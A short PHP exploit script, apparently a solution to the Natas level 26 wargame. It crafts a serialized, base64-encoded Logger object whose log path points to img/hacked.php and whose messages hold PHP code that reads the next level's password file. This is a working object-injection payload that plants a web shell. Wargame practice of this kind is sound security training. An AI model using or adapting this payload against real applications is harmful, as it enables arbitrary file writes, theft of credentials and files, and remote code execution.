<?php

class Logger {
        private $logFile="img/hacked.php";
        private $initMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
        private $exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
}

$foo = new Logger;

// $drawing = new stdClass;
// $drawing->x1 = 1;
// $drawing->y1 = 100;
// $drawing->x2 = 2;
// $drawing->y2 = 200;

echo base64_encode(serialize($foo));

// echo serialize([$drawing]);

